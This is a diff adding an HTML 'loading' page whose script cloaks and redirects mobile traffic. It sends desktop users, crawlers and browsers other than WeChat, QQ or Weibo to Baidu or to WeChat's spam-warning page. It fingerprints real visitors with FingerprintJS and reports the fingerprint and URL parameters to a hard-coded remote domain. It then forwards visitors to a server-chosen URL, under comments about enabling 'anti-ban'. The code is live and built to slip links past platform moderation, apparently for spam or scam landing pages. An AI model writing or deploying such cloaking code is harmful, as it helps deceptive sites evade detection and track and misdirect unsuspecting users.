@@ -1,0 +1,319 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <title>正在为您加载最优线路...</title>
+   
+    <style type="text/css">
+
+        .loading {
+            position: absolute;
+            margin: auto;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            width: 6.250em;
+            height: 6.250em;
+
+            -webkit-animation: rotate 2.4s linear infinite;
+            -moz-animation: rotate 2.4s linear infinite;
+            -o-animation: rotate 2.4s linear infinite;
+            animation: rotate 2.4s linear infinite;
+        }
+
+        .loading .white {
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            opacity: 0;
+
+            -webkit-animation: flash 2.4s linear infinite;
+            -moz-animation: flash 2.4s linear infinite;
+            -o-animation: flash 2.4s linear infinite;
+            animation: flash 2.4s linear infinite;
+        }
+
+        .loading .dot {
+            position: absolute;
+            margin: auto;
+            width: 2.4em;
+            height: 2.4em;
+            border-radius: 100%;
+
+            -webkit-transition: all 1s ease;
+            -moz-transition: all 1s ease;
+            -o-transition: all 1s ease;
+            transition: all 1s ease;
+        }
+
+        .loading .dot:nth-child(2) {
+            top: 0;
+            bottom: 0;
+            left: 0;
+            background: #FF4444;
+
+            -webkit-animation: dotsY 2.4s linear infinite;
+            -moz-animation: dotsY 2.4s linear infinite;
+            -o-animation: dotsY 2.4s linear infinite;
+            animation: dotsY 2.4s linear infinite;
+        }
+
+        .loading .dot:nth-child(3) {
+            left: 0;
+            right: 0;
+            top: 0;
+            background: #FFBB33;
+
+            -webkit-animation: dotsX 2.4s linear infinite;
+            -moz-animation: dotsX 2.4s linear infinite;
+            -o-animation: dotsX 2.4s linear infinite;
+            animation: dotsX 2.4s linear infinite;
+        }
+
+        .loading .dot:nth-child(4) {
+            top: 0;
+            bottom: 0;
+            right: 0;
+            background: #99CC00;
+
+            -webkit-animation: dotsY 2.4s linear infinite;
+            -moz-animation: dotsY 2.4s linear infinite;
+            -o-animation: dotsY 2.4s linear infinite;
+            animation: dotsY 2.4s linear infinite;
+        }
+
+        .loading .dot:nth-child(5) {
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #33B5E5;
+
+            -webkit-animation: dotsX 2.4s linear infinite;
+            -moz-animation: dotsX 2.4s linear infinite;
+            -o-animation: dotsX 2.4s linear infinite;
+            animation: dotsX 2.4s linear infinite;
+        }
+
+        @keyframes rotate {
+            0% {
+                -webkit-transform: rotate(0);
+                -moz-transform: rotate(0);
+                -o-transform: rotate(0);
+                transform: rotate(0);
+            }
+            10% {
+                width: 6.250em;
+                height: 6.250em;
+            }
+            66% {
+                width: 2.4em;
+                height: 2.4em;
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+                width: 6.250em;
+                height: 6.250em;
+            }
+        }
+
+        @keyframes dotsY {
+            66% {
+                opacity: .1;
+                width: 2.4em;
+            }
+            77% {
+                opacity: 1;
+                width: 0;
+            }
+        }
+
+        @keyframes dotsX {
+            66% {
+                opacity: .1;
+                height: 2.4em;
+            }
+            77% {
+                opacity: 1;
+                height: 0;
+            }
+        }
+
+        @keyframes flash {
+            33% {
+                opacity: 0;
+                border-radius: 0%;
+            }
+            55% {
+                opacity: .6;
+                border-radius: 100%;
+            }
+            66% {
+                opacity: 0;
+            }
+        }
+    </style>
+    <script src="https://cdn.bootcdn.net/ajax/libs/fingerprintjs2/2.1.5/fingerprint2.min.js"></script>
+
+
+</head>
+
+<body>
+
+<div class="loading">
+    <div class="dot white"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+</div>
+
+
+
+</body>
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script type="text/javascript">
+
+  if(window.screen.width==0){window.location.replace("https://m.baidu.com")};
+    var system={win:false,mac:false,xll:false};
+  var p = navigator . platform ;
+    system.win=p.indexOf("Win")==0;
+    system.mac=p.indexOf("Mac")==0;
+    system.x11=(p=="X11") || (p.indexOf("Linux")==0);
+    if(system.win||system.mac||system.xll){
+    location.replace("http://m.baidu.com");
+    }
+    var ua = navigator.userAgent.toLowerCase(); //判断浏览器的类型
+    if (ua.match(/WeiBo/i) != "weibo" && ua.match(/QQ/i) != "qq" && ua.indexOf('micromessenger') == -1) {
+        location.replace("http://m.baidu.com");
+    }else{
+    }
+    
+    //判断是不是爬虫如果是就不跳转--
+ function mayIComing() {
+            var comming = true;
+            if (typeof console === 'undefined') {
+                comming = false;
+            } else if (typeof navigator === 'undefined') {
+                comming = false;
+            } else if (navigator.webdriver) {
+                comming = false;
+            } else if (typeof screen === 'undefined') {
+                comming = false;
+            } else if (screen.width < 100 || screen.height < 100) {
+                comming = false;
+            } else if (typeof navigator.userAgent === 'undefined') {
+                comming = false;
+            } else if (typeof getComputedStyle !== 'function') {
+                comming = false;
+            } else if (typeof window === 'undefined') {
+                comming = false;
+            } else if (typeof window.addEventListener === 'undefined') {
+                comming = false;
+            } else if (typeof JSON === 'undefined') {
+                comming = false;
+            }
+
+            return comming;
+        }
+
+
+   
+   // 默认接口域名，请填写你的接口域名
+    let host = "http://xh.jiuxuantang2.top"  //冒号内请改成你的域名 如http://baidu.com  
+ 
+ //屏蔽浏览器f12调试
+
+   function getRequest() {
+        var url = window.location.search; //获取url中"?"符后的字串
+        var theRequest = new Object();
+        if (url.indexOf("?") != -1) {
+            var str = url.substr(url.indexOf("?") + 1);
+            str = str.replace(/&amp;/g, '&');
+            var strs = str.split("&");
+            for (var i = 0; i < strs.length; i++) {
+                theRequest[strs[i].split("=")[0]] = decodeURI(strs[i].split("=")[1]);
+            }
+        }
+        return theRequest;
+    }
+    function aa() {
+        try {
+            Fingerprint2.get(function (components) {
+                const values = components.map(function (component, index) {
+                    if (index === 0) { //把微信浏览器里UA的wifi或4G等网络替换成空,不然切换网络会ID不一样
+                        return component.value.replace(/\bNetType\/\w+\b/, '')
+                    }
+                    return component.value
+                })
+                // 生成最终id murmur
+                const murmur = Fingerprint2.x64hash128(values.join(''), 32)
+                // document.getElementById("fingerprint").value = murmur
+                //console.log(document.getElementById("fingerprint").value)
+
+                if (murmur) {
+
+                    var params = getRequest()
+                    console.log(params)
+                    if(params.f == '' || params.f == undefined)
+                    {
+                        alert('参数丢失!');
+                        return
+                    }
+                    var pp = {
+                        f: params.f,
+                        fingerprint: murmur,
+                        ua:params.ua
+                    };
+                    console.log(pp);
+                    $.getJSON(host + '/index/index',pp,function (res) {
+                        console.log(res)
+                        if(res.code == 99)
+                        {
+                            location.href = res.data.url;
+                            return
+                        }
+
+                        if(res.code == 0)
+                        {
+                            //开启防封
+                            if(res.data.ff_pc == 1)
+                            {
+                                var system = {win: false, mac: false, xll: false};
+                                var p = navigator.platform;
+                                system.win = p.indexOf("Win") == 0;
+                                system.mac = p.indexOf("Mac") == 0;
+                                system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+                                if (system.win || system.mac || system.xll) {
+                                    window.location.href = "https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=0&source=2";
+                                    return
+                                }
+                            }
+                            //创建用户
+                            $.getJSON(host + '/index/index/create', pp, function (e) {
+                                console.log(e)
+                                if (e.status == 1) {
+
+                                    var url = res.data.domain + "?f="+res.data.f+"&view_id="+res.data.view_id+"&h_url="+res.data.hezi+"&alert(https://baidu.com)"+"&fingerprint=" + murmur + "&h="+res.data.h_id;
+                                    location.href = url;
+
+                                    return
+                                }
+                            })
+                        }
+                    })
+                }
+                // document.getElementById("btn").click()
+            })
+        } catch (error) {
+            console.log(error)
+            // alert(error)
+        }
+    }
+    aa();
+</script>
+</html>
